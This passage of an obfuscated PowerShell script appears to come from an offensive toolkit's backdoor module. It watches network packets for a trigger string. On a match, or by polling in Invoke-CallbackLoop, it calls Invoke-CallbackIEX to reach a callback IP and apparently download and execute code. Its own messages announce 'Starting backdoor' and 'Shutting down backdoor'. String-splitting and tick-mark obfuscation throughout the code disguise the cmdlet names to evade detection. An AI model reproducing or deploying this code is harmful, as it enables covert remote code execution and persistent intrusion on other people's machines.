		${SO`URc`e`IpAdDR`ess} = ${Bi`NaRY`R`EAder}.("{2}{1}{0}"-f'2','3','ReadUInt').Invoke()
		${sOu`RceIp`AddRess} = [System.Net.IPAddress]${S`Our`cEIpad`dREss}
		${d`eStIna`Ti`ONiPAD`dreSs} = ${BI`NaRYR`EaDER}.("{3}{0}{2}{1}" -f'eadUI','32','nt','R').Invoke()
		${DE`STinaTi`oNiP`A`dDRe`Ss} = [System.Net.IPAddress]${DEST`InaTioNI`PADD`Ress}
		${R`E`MaiNdER`BYtEs} = ${binaR`yrEA`d`er}.("{2}{1}{0}"-f 's','adByte','Re').Invoke(${MEMo`Rys`T`Ream}."L`enGtH")
		
		
		${asCIienC`Od`InG} = &("{2}{1}{0}" -f'ect','w-obj','ne') ("{0}{2}{6}{5}{3}{4}{1}"-f 'syst','g','em','a','sciiencodin','xt.','.te')
		${R`Em`AIND`Er`ofPAcket} = ${a`Sci`iENCoD`InG}."GEts`TriNg"(${rE`mAiNDeR`By`TES})
		
		
		${Bi`NA`R`yREADEr}.("{1}{0}"-f'lose','C').Invoke()
		${M`EmOrYs`TRe`Am}.("{1}{0}" -f 'ose','Cl').Invoke()
		
		
		if (${remAIN`d`E`R`ofpA`ckEt} -match ${Tr`IG`Ger})
		{
			&("{2}{1}{0}{3}"-f 'ite','r','w','-host') ("{0}{1}" -f 'Match:',' ') ${SO`UrCEi`Pa`DDRE`Ss}
			${rU`N`NiNG}=${fA`LSE}
			${M`ATch} = ${so`UrCE`ip`ADd`Ress}
		}
	}
	
	if(${m`AtCh})
	{
		if(${cal`Lba`Ck`Ip})
		{
			${suCce`SS} = &("{3}{1}{4}{0}{2}{5}" -f'Cal','k','l','Invo','e-','backIEX') ${CaLlBA`c`kIP}
		}
		else
		{
			${SUCce`ss} = &("{3}{1}{0}{2}"-f'k','oke-Callbac','IEX','Inv') ${Mat`cH}
		}
	}
	
}

function InVO`Ke-`CaLLbA`CkLOOP
{

	Param(  
	[Parameter(mAnDatORY=${t`RuE},pOsiTiOn=1)]
	[string]${cal`lBacK`ip},
	[Parameter(MandAtORy=${F`A`Lse},posiTION=2)]
	[int]${T`imE`OuT}=0,
	[Parameter(MandATory=${F`ALSe},pOsItiOn=3)]
	[int] ${SLE`eP}=1
	)
	
		
	&("{0}{1}{2}"-f 'w','rite-','host') ('Ti'+'m'+'eo'+'ut: '+"$Timeout")
	&("{0}{2}{1}"-f'write-h','t','os') ('Sl'+'ee'+'p: '+"$Sleep")
	&("{1}{0}{2}" -f'e-ho','writ','st') ('C'+'a'+'llbac'+'kIP: '+"$CallbackIP")
	&("{1}{2}{0}{3}"-f'e-ho','wri','t','st')
	&("{2}{0}{1}"-f 'ite-hos','t','wr') ("{0}{4}{2}{1}{3}{5}"-f 'St','ackd','ng b','o','arti','or...')
	
	
	${ru`N`NING}=${TR`UE}
	${Ma`Tch} =""
	${Sta`RTt`IMe} = &("{2}{0}{1}"-f '-dat','e','get')
	while(${r`UnnI`Ng})
	{
		
		if (${TI`mEo`Ut} -ne 0 -and ($(  ${z`J3}::"N`Ow") -gt ${STAr`TT`I`me}.("{2}{1}{0}" -f 's','econd','adds').Invoke(${ti`m`Eout})))  
		{
			${rU`Nn`ing}=${fA`lse}
		}
		
		${cHE`cks`U`cCe`SS} = &("{0}{2}{3}{4}{1}"-f'I','lbackIEX','nv','oke-Ca','l') ${c`ALl`B`ACkiP} -Silent ${T`Rue}
		
		if(${C`he`ckSU`cCESS} -eq 1)
		{
			${RuNN`INg}=${fa`lsE}
		}
		
		&("{0}{1}"-f 'sl','eep') -s ${SlE`Ep}
	}
	
	&("{3}{0}{1}{2}"-f'r','ite-h','ost','w') ("{1}{0}{4}{5}{6}{3}{2}" -f'tt','Shu','..','oor.','in','g down',' backd')
}